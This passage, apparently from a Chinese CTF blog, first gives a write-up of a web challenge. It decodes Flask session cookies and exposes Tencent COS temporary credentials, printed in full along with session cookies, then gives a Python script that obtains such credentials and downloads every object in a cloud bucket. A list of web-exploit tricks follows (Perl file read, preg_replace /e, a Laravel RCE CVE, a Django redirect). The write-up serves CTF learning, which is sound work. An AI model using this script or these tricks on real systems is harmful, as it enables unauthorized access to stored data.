class="hljs-number">57</span>Z<span class="hljs-number">5</span>mBKeu<span class="hljs-number">4</span>JuhKcKTZM<br></code></pre></td></tr></table></figure><p>第二次获取index：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">session</span>=.eJwlj<span class="hljs-number">0</span>tqBDEMBe_i<span class="hljs-number">9</span>QxIsmxLc<span class="hljs-number">5</span>nG<span class="hljs-number">1</span>oeEQALdM<span class="hljs-number">6</span>uQu<span class="hljs-number">8</span>chy<span class="hljs-number">1</span>o<span class="hljs-number">8</span>qt<span class="hljs-number">53</span>OfKM<span class="hljs-number">6608</span>nucrbuV<span class="hljs-number">49</span>_IoJGZ<span class="hljs-number">9</span>zqquOQVZnFZdPpoir<span class="hljs-number">2</span>nhvS<span class="hljs-number">1</span>uTGFqFrmCcHqDNGfnjShJBNLRmTr<span class="hljs-number">1</span>YBKaq<span class="hljs-number">8</span>fwqmyjYV_VpufGFpO<span class="hljs-number">8</span>NqcRmgpQRwKUW<span class="hljs-number">7</span>HrzOP<span class="hljs-number">59</span>RGfu<span class="hljs-number">2</span>eru<span class="hljs-number">5</span>Dnn<span class="hljs-number">5</span>GlA<span class="hljs-number">6</span>ZOkkWVNMVUxbxXFd<span class="hljs-number">671</span>xXn_<span class="hljs-number">4</span>nKqLlG<span class="hljs-number">3</span>MHqvCPGuq<span class="hljs-number">8</span>WG<span class="hljs-number">4</span>lpGgYAUPn<span class="hljs-number">5</span>BeM<span class="hljs-number">1</span>SUI.X<span class="hljs-number">4</span>VYvg.zq_cxptWmN<span class="hljs-number">4</span>u<span class="hljs-number">6</span>-xw<span class="hljs-number">2</span>cbUnLkVRq<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>初步推断和flask session伪造有关</p><h5 id="2、session分析"><a href="#2、session分析" class="headerlink" title="2、session分析"></a>2、session分析</h5><p>第一个：注册生成的session经过decode可以看出其作用是跨站请求获取验证码，后续也许会在脚本里面用到（大概，用不上更好</p><p>第二个：先跑个解密脚本</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> flask_session_cookie_manager<span class="hljs-number">3</span>.py decode -c <span class="hljs-string">&quot;&quot;</span>.eJwlj<span class="hljs-number">0</span>tqBDEMBe_i<span class="hljs-number">9</span>QxIsmxLc<span class="hljs-number">5</span>nG<span class="hljs-number">1</span>oeEQALdM<span class="hljs-number">6</span>uQu<span class="hljs-number">8</span>chy<span class="hljs-number">1</span>o<span class="hljs-number">8</span>qt<span class="hljs-number">53</span>OfKM<span class="hljs-number">6608</span>nucrbuV<span class="hljs-number">49</span>_IoJGZ<span class="hljs-number">9</span>zqquOQVZnFZdPpoir<span class="hljs-number">2</span>nhvS<span class="hljs-number">1</span>uTGFqFrmCcHqDNGfnjShJBNLRmTr<span class="hljs-number">1</span>YBKaq<span class="hljs-number">8</span>fwqmyjYV_VpufGFpO<span class="hljs-number">8</span>NqcRmgpQRwKUW<span class="hljs-number">7</span>HrzOP<span class="hljs-number">59</span>RGfu<span class="hljs-number">2</span>eru<span class="hljs-number">5</span>Dnn<span class="hljs-number">5</span>GlA<span class="hljs-number">6</span>ZOkkWVNMVUxbxXFd<span class="hljs-number">671</span>xXn_<span class="hljs-number">4</span>nKqLlG<span class="hljs-number">3</span>MHqvCPGuq<span class="hljs-number">8</span>WG<span class="hljs-number">4</span>lpGgYAUPn<span class="hljs-number">5</span>BeM<span class="hljs-number">1</span>SUI.X<span class="hljs-number">4</span>VYuQ.EKJlGQlo<span class="hljs-number">57</span>Z<span class="hljs-number">5</span>mBKeu<span class="hljs-number">4</span>JuhKcKTZM<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-attribute">python</span> flask_session_cookie_manager<span class="hljs-number">3</span>.py decode -c <span class="hljs-string">&quot;&quot;</span>.eJwlj<span class="hljs-number">0</span>tqBDEMBe_i<span class="hljs-number">9</span>QxIsmxLc<span class="hljs-number">5</span>nG<span class="hljs-number">1</span>oeEQALdM<span class="hljs-number">6</span>uQu<span class="hljs-number">8</span>chy<span class="hljs-number">1</span>o<span class="hljs-number">8</span>qt<span class="hljs-number">53</span>OfKM<span class="hljs-number">6608</span>nucrbuV<span class="hljs-number">49</span>_IoJGZ<span class="hljs-number">9</span>zqquOQVZnFZdPpoir<span class="hljs-number">2</span>nhvS<span class="hljs-number">1</span>uTGFqFrmCcHqDNGfnjShJBNLRmTr<span class="hljs-number">1</span>YBKaq<span class="hljs-number">8</span>fwqmyjYV_VpufGFpO<span class="hljs-number">8</span>NqcRmgpQRwKUW<span class="hljs-number">7</span>HrzOP<span class="hljs-number">59</span>RGfu<span class="hljs-number">2</span>eru<span class="hljs-number">5</span>Dnn<span class="hljs-number">5</span>GlA<span class="hljs-number">6</span>ZOkkWVNMVUxbxXFd<span class="hljs-number">671</span>xXn_<span class="hljs-number">4</span>nKqLlG<span class="hljs-number">3</span>MHqvCPGuq<span class="hljs-number">8</span>WG<span class="hljs-number">4</span>lpGgYAUPn<span class="hljs-number">5</span>BeM<span class="hljs-number">1</span>SUI.X<span class="hljs-number">4</span>VYvg.zq_cxptWmN<span class="hljs-number">4</span>u<span class="hljs-number">6</span>-xw<span class="hljs-number">2</span>cbUnLkVRq<span class="hljs-number">0</span><span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-attribute">python</span> flask_session_cookie_manager<span class="hljs-number">3</span>.py decode -c <span class="hljs-string">&quot;&quot;</span>.eJwlj<span class="hljs-number">0</span>tqBDEMBe_i<span class="hljs-number">9</span>QxIsmxLc<span class="hljs-number">5</span>nG<span class="hljs-number">1</span>oeEQALdM<span class="hljs-number">6</span>uQu<span class="hljs-number">8</span>chy<span class="hljs-number">1</span>o<span class="hljs-number">8</span>qt<span class="hljs-number">53</span>OfKM<span class="hljs-number">6608</span>nucrbuV<span class="hljs-number">49</span>_IoJGZ<span class="hljs-number">9</span>zqquOQVZnFZdPpoir<span class="hljs-number">2</span>nhvS<span class="hljs-number">1</span>uTGFqFrmCcHqDNGfnjShJBNLRmTr<span class="hljs-number">1</span>YBKaq<span class="hljs-number">8</span>fwqmyjYV_VpufGFpO<span class="hljs-number">8</span>NqcRmgpQRwKUW<span class="hljs-number">7</span>HrzOP<span class="hljs-number">59</span>RGfu<span class="hljs-number">2</span>eru<span class="hljs-number">5</span>Dnn<span class="hljs-number">5</span>GlA<span class="hljs-number">6</span>ZOkkWVNMVUxbxXFd<span class="hljs-number">671</span>xXn_<span class="hljs-number">4</span>nKqLlG<span class="hljs-number">3</span>MHqvCPGuq<span class="hljs-number">8</span>WG<span class="hljs-number">4</span>lpGgYAUPn<span class="hljs-number">5</span>BeM<span class="hljs-number">1</span>SUI.X<span class="hljs-number">4</span>VijA.P<span class="hljs-number">9</span>_<span class="hljs-number">9</span>JmNsS<span class="hljs-number">4</span>HgsKJYHKa<span class="hljs-number">9</span>csN_DKo<span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>解密得到结果：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c">b&#x27;&#123;&quot;_fresh&quot;:true,&quot;_id&quot;:&quot;28cc6aa39d9fa<span class="hljs-number">8148</span>d2b3bd<span class="hljs-number">7591</span>4baced65b<span class="hljs-number">4542</span>ec9ccefbe21ad50fcd4d4fbe18f<span class="hljs-number">220861</span>d<span class="hljs-number">4262</span>6e<span class="hljs-number">4282</span>ab6e7d394c<span class="hljs-number">7516</span>b3cadfd395ea2d35d27e9f<span class="hljs-number">9003</span>7f00&quot;,&quot;csrf_token&quot;:&quot;bd<span class="hljs-number">7682</span>df42ec<span class="hljs-number">4860</span>1f9a28b<span class="hljs-number">2329</span>f8c998cd<span class="hljs-number">6398</span>4&quot;,&quot;user_id&quot;:&quot;<span class="hljs-number">3419</span>fb7e-0c3a-11eb-b5ee-<span class="hljs-number">0242</span>ac1e<span class="hljs-number">0002</span>&quot;&#125;&#x27;<br><br>b&#x27;&#123;&quot;_fresh&quot;:true,&quot;_id&quot;:&quot;28cc6aa39d9fa<span class="hljs-number">8148</span>d2b3bd<span class="hljs-number">7591</span>4baced65b<span class="hljs-number">4542</span>ec9ccefbe21ad50fcd4d4fbe18f<span class="hljs-number">220861</span>d<span class="hljs-number">4262</span>6e<span class="hljs-number">4282</span>ab6e7d394c<span class="hljs-number">7516</span>b3cadfd395ea2d35d27e9f<span class="hljs-number">9003</span>7f00&quot;,&quot;csrf_token&quot;:&quot;bd<span class="hljs-number">7682</span>df42ec<span class="hljs-number">4860</span>1f9a28b<span class="hljs-number">2329</span>f8c998cd<span class="hljs-number">6398</span>4&quot;,&quot;user_id&quot;:&quot;<span class="hljs-number">3419</span>fb7e-0c3a-11eb-b5ee-<span class="hljs-number">0242</span>ac1e<span class="hljs-number">0002</span>&quot;&#125;&#x27;<br><br>b&#x27;&#123;&quot;_fresh&quot;:true,&quot;_id&quot;:&quot;28cc6aa39d9fa<span class="hljs-number">8148</span>d2b3bd<span class="hljs-number">7591</span>4baced65b<span class="hljs-number">4542</span>ec9ccefbe21ad50fcd4d4fbe18f<span class="hljs-number">220861</span>d<span class="hljs-number">4262</span>6e<span class="hljs-number">4282</span>ab6e7d394c<span class="hljs-number">7516</span>b3cadfd395ea2d35d27e9f<span class="hljs-number">9003</span>7f00&quot;,&quot;csrf_token&quot;:&quot;bd<span class="hljs-number">7682</span>df42ec<span class="hljs-number">4860</span>1f9a28b<span class="hljs-number">2329</span>f8c998cd<span class="hljs-number">6398</span>4&quot;,&quot;user_id&quot;:&quot;<span class="hljs-number">3419</span>fb7e-0c3a-11eb-b5ee-<span class="hljs-number">0242</span>ac1e<span class="hljs-number">0002</span>&quot;&#125;&#x27;<br></code></pre></td></tr></table></figure><p>不知道key，卡住</p><h5 id="3、flask分析"><a href="#3、flask分析" class="headerlink" title="3、flask分析"></a>3、flask分析</h5><p>随便找了几个位置打ssti，都没啥东西，估计走不通</p><h5 id="4、文件上传"><a href="#4、文件上传" class="headerlink" title="4、文件上传"></a>4、文件上传</h5><p>如果上传文件的文件名是类似%7B%7B2%7D%7D，1之类的，获取文件会出现以下类似的报错回显</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">This</span> XML file does not appear to have any style information associated with it. The document tree is shown below.<br><span class="hljs-section">&lt;Error&gt;</span><br><span class="hljs-section">&lt;Code&gt;</span><span class="hljs-attribute">NoSuchKey</span>&lt;/Code&gt;<br><span class="hljs-section">&lt;Message&gt;</span><span class="hljs-attribute">The</span> specified key does not exist.&lt;/Message&gt;<br><span class="hljs-section">&lt;Resource&gt;</span><span class="hljs-attribute">file</span>-<span class="hljs-number">1252100769</span>.cos.ap-guangzhou.myqcloud.com/<span class="hljs-number">3419</span>fb<span class="hljs-number">7</span>e-<span class="hljs-number">0</span>c<span class="hljs-number">3</span>a-<span class="hljs-number">11</span>eb-b<span class="hljs-number">5</span>ee-<span class="hljs-number">0242</span>ac<span class="hljs-number">1</span>e<span class="hljs-number">0002</span>/&#123;&#123;<span class="hljs-number">2</span>&#125;&#125;&lt;/Resource&gt;<br><span class="hljs-section">&lt;RequestId&gt;</span><span class="hljs-attribute">NWY4NDQzYjJfNzNhMzNiMGFfMjk2Y18yNzQyZjE1</span>&lt;/RequestId&gt;<br><span class="hljs-section">&lt;TraceId&gt;</span><span class="hljs-attribute">OGVmYzZiMmQzYjA2OWNhODk0NTRkMTBiOWVmMDAxODc0OWRkZjk0ZDM1NmI1M2E2MTRlY2MzZDhmNmI5MWI1OTdjMDczODYwZjM5YTU3ZmZmOWI5MmY4NjkxY2I3MGNiMzdmNDNiMDY2MjNhZjAzN2RiYjViNmQ5ZGFkZTk1Njc</span>=&lt;/TraceId&gt;<br><span class="hljs-section">&lt;/Error&gt;</span><br></code></pre></td></tr></table></figure><p>同一账号下，读取时间和读取文件会影响RequestId的值，但TraceId保持不变</p><p>TraceId通过base64出来是128位</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">8</span>efc<span class="hljs-number">6</span>b<span class="hljs-number">2</span>d<span class="hljs-number">3</span>b<span class="hljs-number">069</span>ca<span class="hljs-number">89454</span>d<span class="hljs-number">10</span>b<span class="hljs-number">9</span>ef<span class="hljs-number">0018749</span>ddf<span class="hljs-number">94</span>d<span class="hljs-number">356</span>b<span class="hljs-number">53</span>a<span class="hljs-number">614</span>ecc<span class="hljs-number">3</span>d<span class="hljs-number">8</span>f<span class="hljs-number">6</span>b<span class="hljs-number">91</span>b<span class="hljs-number">597</span><span class="hljs-keyword">c</span><span class="hljs-number">073860</span>f<span class="hljs-number">39</span>a<span class="hljs-number">57</span>fff<span class="hljs-number">9</span>b<span class="hljs-number">92</span>f<span class="hljs-number">8691</span>cb<span class="hljs-number">70</span>cb<span class="hljs-number">37</span>f<span class="hljs-number">43</span>b<span class="hljs-number">06623</span>af<span class="hljs-number">037</span>dbb<span class="hljs-number">5</span>b<span class="hljs-number">6</span>d<span class="hljs-number">9</span>dade<span class="hljs-number">9567</span><br></code></pre></td></tr></table></figure><p>不知道有啥用。。。先放一下</p><h4 id="陈学长指点：-1"><a href="#陈学长指点：-1" class="headerlink" title="陈学长指点："></a>陈学长指点：</h4><p>关键词：cos，云安全</p><p>上传文件抓包：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;sessionToken&quot;</span>: <span class="hljs-string">&quot;G8krVwh3NTbHu41jxbfFnhsRprMbt8ma680be833e6405f5c1854c1a426cf73436yVIvHjOoY-ytPlOwtyp15-pZyiYlRoFOk0u72cCOM6qI-L4NqQV_RJA0OaIznxuAoXEXGass6--CMy8FrG6YTOGhUHsFgNdeiugAxnzAvO8-klS2Q57B7nF7Q-j__9dM04LJwAWKFOc2rDSzUBxrN6Iv4ZKWDfz-_uHpAv8y3R7qkw_pCYKm6ZhI-hvSNWivpDJ6RO4p52XfvCFY1fl6_BkYVlOYSLqDwf_KP3Rc3RnvzYr7-6K9V8zYl_QJGhmoUmZlT9FF9GLRrBo2sDGm_ojnDckTdyM1wxpUJdoGLwg44RF95B_g3CD0HSPzi0HCyY5FpGzzzFHpQMoOAb_BIRmstkZ6D92jmPhkM69CjIb5I8XlkF7T0MfsA8r4H3J26YzxwEhAKjQ58Erp35RUdHWIBEroakvwwk5PNzyDIYlpiHvdKERLDZx74-OgeEMiz1Ih2E8dE5jz9UZ4OOKN18NxUZ75ZeX48faMcvw1uaR0xfygrBtnuJudAyXuLy6tG99HMFWUxqC-4gAKwIhWjznwMmconXZtTpxSHq2EylHUe1qxyV-d_20kwu8jaEpUztBKd6nSx0tr2vyBBOnUfvY1VsQYpUlo-5Zn1soX9Fu90ohinaBkdnBM5-SBwInPGngYkb91jPV9dSi775Q7lSWM_6qla3ow7WUDmuQ0XRSF1duIFfvub8RSnTi1eXUKsHE1PzX6n3tECe7GG4Vd3M2cZtlHjeYS-7fbaDQ_4DeAVxnazDc4SXhb-Nir6V_kVRYmdE6C5SiUach2lx3AyVbXNZ2PFgNSpG3HyDQTWZzPpp9fDYoKuxT3ixLyQrOQyGvRlnCq4Nv0LkBbbVTbGGvaQbU4E-D0yLloi9KtJU&quot;</span>, <span class="hljs-attr">&quot;tmpSecretId&quot;</span>: <span class="hljs-string">&quot;AKIDeO-sGaYQNu7p4fY3czQvT8l2C6V-RuP_-HtovOapviSl6V639-nri-EVtXDF5zBe&quot;</span>, <span class="hljs-attr">&quot;tmpSecretKey&quot;</span>: <span class="hljs-string">&quot;YLhSFXm7ku6Aojrf4MYsAdhAp+8GT/HjPtUZxZlvbpg=&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>同时又有</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">bucket</span> = <span class="hljs-string">&quot;file-1252100769&quot;</span><span class="hljs-comment">;</span><br><span class="hljs-attr">region</span> = <span class="hljs-string">&quot;ap-guangzhou&quot;</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> qcloud_cos <span class="hljs-keyword">import</span> CosConfig<br><span class="hljs-keyword">from</span> qcloud_cos <span class="hljs-keyword">import</span> CosS3Client<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> re<br><br>logging.basicConfig(level=logging.INFO, stream=sys.stdout)<br><br>url = <span class="hljs-string">&#x27;http://49.234.127.130:10009/gen_tmp_credentials&#x27;</span><br><br>header = &#123;<br>    <span class="hljs-string">&#x27;Content-type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>    <span class="hljs-string">&#x27;Origin&#x27;</span>: <span class="hljs-string">&#x27;http://49.234.127.130:10009&#x27;</span>,<br>    <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;http://49.234.127.130:10009/?success&#x27;</span>,<br>    <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;session=.eJwlj0tqBDEMBe_i9QxIsmxLc5nG1oeEQALdM6uQu8chy1o8qt53OfKM6608nucrbuV49_IoJGZ9zqquOQVZnFZdPpoir2nhvS1uTGFqFrmCcHqDNGfnjShJBNLRmTr1YBKaq8fwqmyjYV_VpufGFpO8NqcRmgpQRwKUW7HrzOP59RGfu2eru5Dnn5GlA6ZOkkWVNMVUxbxXFd671xXn_4nKqLlG3MHqvCPGuq8WG4lpGgYAUPn5BeM1SUI.X4VmVQ.hvZgCQr44DV5QOVPQhWyqsMGnDE&#x27;</span><br>&#125;<br><br>data = &#123;<br>    <span class="hljs-string">&quot;prefix&quot;</span>: <span class="hljs-string">&quot;3419fb7e-0c3a-11eb-b5ee-0242ac1e0002&quot;</span><br>&#125;<br><br>s = requests.Session()<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_key</span>():</span><br>    re = s.post(url, data=json.dumps(data), headers=header)<br>    <span class="hljs-keyword">return</span> s.post(url, data=json.dumps(data), headers=header).json()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    credentials = get_key()<br><br>    bucket = <span class="hljs-string">&#x27;file-1252100769&#x27;</span><br><br>    secret_id = credentials[<span class="hljs-string">&#x27;tmpSecretId&#x27;</span>]<br>    secret_key = credentials[<span class="hljs-string">&#x27;tmpSecretKey&#x27;</span>]<br>    region = <span class="hljs-string">&#x27;ap-guangzhou&#x27;</span><br>    token = credentials[<span class="hljs-string">&#x27;sessionToken&#x27;</span>]<br>    scheme = <span class="hljs-string">&#x27;https&#x27;</span><br>    config = CosConfig(Region=region, SecretId=secret_id,<br>                       SecretKey=secret_key, Token=token, Scheme=scheme)<br><br>    client = CosS3Client(config)<br><br>    response = client.list_objects(<br>        Bucket=bucket,<br>        Prefix=<span class="hljs-string">&#x27;&#x27;</span><br>    )<br><br>    filename1 = <span class="hljs-string">&#x27;Allresponse.txt&#x27;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename1, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(<span class="hljs-built_in">str</span>(response))<br>    f.close()<br><br>    filename2 = <span class="hljs-string">&#x27;Allfile.txt&#x27;</span><br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> response[<span class="hljs-string">&#x27;Contents&#x27;</span>]:<br>        Key = a[<span class="hljs-string">&#x27;Key&#x27;</span>]<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;exe&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(Key):<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;60000.jffs2&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(Key):<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;f8b6242c-0bad-11eb-9463-0242ac&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(Key):<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;dll&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(Key):<br>            <span class="hljs-keyword">continue</span><br><br>        f = client.get_object(<br>            Bucket=bucket,<br>            Key=Key,<br>        )<br><br>        fp = f[<span class="hljs-string">&#x27;Body&#x27;</span>].get_raw_stream()<br>        rel = fp.read()<br>        restr = <span class="hljs-built_in">str</span>(rel)<br><br>        a = re.findall(<span class="hljs-string">r&#x27;flag&#123;\w*&#125;&#x27;</span>, restr)<br>        <span class="hljs-keyword">if</span> a != []:<br>            <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> a:<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename2, <span class="hljs-string">&#x27;a+&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                    f.write(<span class="hljs-string">&#x27;Key:&#x27;</span> + Key + <span class="hljs-string">&#x27;-----Value:&#x27;</span>+ b + <span class="hljs-string">&#x27;\n&#x27;</span>)<br><br><br></code></pre></td></tr></table></figure><p>找到对应的目录以及</p><h4 id="flag：-2"><a href="#flag：-2" class="headerlink" title="flag："></a>flag：</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;c<span class="hljs-number">8130</span>d<span class="hljs-number">909</span>ee<span class="hljs-number">595263</span>e<span class="hljs-number">177</span>a<span class="hljs-number">8254</span>af<span class="hljs-number">5</span>c<span class="hljs-number">81</span>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>做题笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>做题笔记</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>trick or treat</title>
    <link href="/2020/10/31/tricks/"/>
    <url>/2020/10/31/tricks/</url>
    
    <content type="html"><![CDATA[<h4 id="Perl文件上传param-函数"><a href="#Perl文件上传param-函数" class="headerlink" title="Perl文件上传param()函数"></a>Perl文件上传param()函数</h4><p>param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的file变量中。如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。对正常的上传文件进行修改,可以达到读取任意文件的目的:</p><p>例如：</p><p><a href="https://imgchr.com/i/Bp5MLD"><img src="https://s1.ax1x.com/2020/10/20/Bp5MLD.png" alt="Bp5MLD.png"></a></p><h4 id="慎用preg-replace危险的-e修饰符"><a href="#慎用preg-replace危险的-e修饰符" class="headerlink" title="慎用preg_replace危险的/e修饰符"></a>慎用preg_replace危险的/e修饰符</h4><p>/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）</p><h4 id="couchDB是个利⽤HTTP请求进⾏操作的数据库，可以确定题是RCE-SSRF"><a href="#couchDB是个利⽤HTTP请求进⾏操作的数据库，可以确定题是RCE-SSRF" class="headerlink" title="couchDB是个利⽤HTTP请求进⾏操作的数据库，可以确定题是RCE/SSRF"></a>couchDB是个利⽤HTTP请求进⾏操作的数据库，可以确定题是RCE/SSRF</h4><h4 id="file-put-contents有-个-trick，-如-果-写-入-的-文-件-名-是-xxxxx-那-么-会-被-忽-略-，-会-直-接-写-入-xxxxx文-件"><a href="#file-put-contents有-个-trick，-如-果-写-入-的-文-件-名-是-xxxxx-那-么-会-被-忽-略-，-会-直-接-写-入-xxxxx文-件" class="headerlink" title="file_put_contents有 个 trick， 如 果 写 入 的 文 件 名 是 xxxxx/.那 么 /.会 被 忽 略 ， 会 直 接 写 入 xxxxx文 件"></a>file_put_contents有 个 trick， 如 果 写 入 的 文 件 名 是 xxxxx/.那 么 /.会 被 忽 略 ， 会 直 接 写 入 xxxxx文 件</h4><h4 id="CVE-2018-15133-Laravel框架RCE"><a href="#CVE-2018-15133-Laravel框架RCE" class="headerlink" title="CVE-2018-15133 Laravel框架RCE"></a>CVE-2018-15133 Laravel框架RCE</h4><p>在 APP_KEY 泄露情况下的 Laravel RCE 漏洞。该漏洞可以分别在两个地方触发，一个是直接添加在 cookie 字段，例如： Cookie: ATTACK=payload ；另一处是在 HTTP Header 处添加 X-XSRF-TOKEN 字段，例如： X-XSRF-TOKEN: payload 。漏洞影响版本：5.5.x&lt;=5.5.40、5.6.x&lt;=5.6.29。</p><h4 id="通-过-app-static-folder-动-态-更-改-静-态-文-件-目-录-，-将-静-态-文-件-目-录-设-为-根-目-录-，-从而任意文件读-这-也-是-pysandbox的-大-部-分-做-法"><a href="#通-过-app-static-folder-动-态-更-改-静-态-文-件-目-录-，-将-静-态-文-件-目-录-设-为-根-目-录-，-从而任意文件读-这-也-是-pysandbox的-大-部-分-做-法" class="headerlink" title="通 过 app.static_folder 动 态 更 改 静 态 文 件 目 录 ， 将 静 态 文 件 目 录 设 为 根 目 录 ， 从而任意文件读 ,这 也 是 pysandbox的 大 部 分 做 法"></a>通 过 app.static_folder 动 态 更 改 静 态 文 件 目 录 ， 将 静 态 文 件 目 录 设 为 根 目 录 ， 从而任意文件读 ,这 也 是 pysandbox的 大 部 分 做 法</h4><h4 id="CVE-2018-14574-Django默认配置下，如果匹配上的URL路由中最后一位是-，而用户访问的时候没加-，Django默认会跳转到带-的请求中。影响范围：1-11-0-lt-version-lt-1-11-15-和-2-0-0-lt-version-lt-2-0-8"><a href="#CVE-2018-14574-Django默认配置下，如果匹配上的URL路由中最后一位是-，而用户访问的时候没加-，Django默认会跳转到带-的请求中。影响范围：1-11-0-lt-version-lt-1-11-15-和-2-0-0-lt-version-lt-2-0-8" class="headerlink" title="CVE-2018-14574 Django默认配置下，如果匹配上的URL路由中最后一位是/，而用户访问的时候没加/，Django默认会跳转到带/的请求中。影响范围：1.11.0 &lt;= version &lt; 1.11.15 和 2.0.0 &lt;= version &lt; 2.0.8"></a>CVE-2018-14574 Django默认配置下，如果匹配上的URL路由中最后一位是/，而用户访问的时候没加/，Django默认会跳转到带/的请求中。影响范围：1.11.0 &lt;= version &lt; 1.11.15 和 2.0.0 &lt;= version &lt; 2.0.8</h4><p>在path开头为//example.com的情况下，Django没做处理，导致浏览器认为目的地址是绝对路径，最终造成任意URL跳转漏洞。</p><h4 id="在Tornado里，应用的设置可以通过handler-settings访问"><a href="#在Tornado里，应用的设置可以通过handler-settings访问" class="headerlink" title="在Tornado里，应用的设置可以通过handler.settings访问"></a>在Tornado里，应用的设置可以通过handler.settings访问</h4><h4 id="CVE-2016-4437-Apache-Shiro-1-2-4反序列化漏洞-Apache-Shiro-lt-1-2-4"><a href="#CVE-2016-4437-Apache-Shiro-1-2-4反序列化漏洞-Apache-Shiro-lt-1-2-4" class="headerlink" title="CVE-2016-4437 Apache Shiro 1.2.4反序列化漏洞 Apache Shiro &lt;= 